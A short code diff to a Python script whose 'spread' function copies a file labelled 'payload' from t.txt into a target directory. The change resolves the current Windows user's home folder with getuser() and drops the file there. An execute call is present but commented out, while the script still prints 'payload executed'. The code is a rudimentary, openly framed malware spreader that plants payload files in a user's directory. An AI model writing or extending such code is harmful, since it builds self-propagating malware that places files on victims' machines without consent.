@@ -1,16 +1,22 @@
 import os
 import sys
+from getpass import *
 
 def spread(dirpath):
-    dp = str(dirpath)+'/t'
+    dp = str(dirpath)+'/t.txt'
     f = open('t.txt', 'rb')
     fd = f.read()
     f.close()
     print('payload loaded')
-    f = open(dp, 'wb')
-    f.write(fd)
-    f.close()
+    f2 = open(dp, 'wb')
+    f2.write(fd)
+    f2.close()
     print('payload shelled to ' + dp)
     os.chdir(str(dirpath))
     #os.system('./')
-    print('payload executed')
+    print('payload executed in ' + str(dirpath))
+    
+
+un = getuser()
+defpath = 'C:/users/'+un
+spread(defpath)
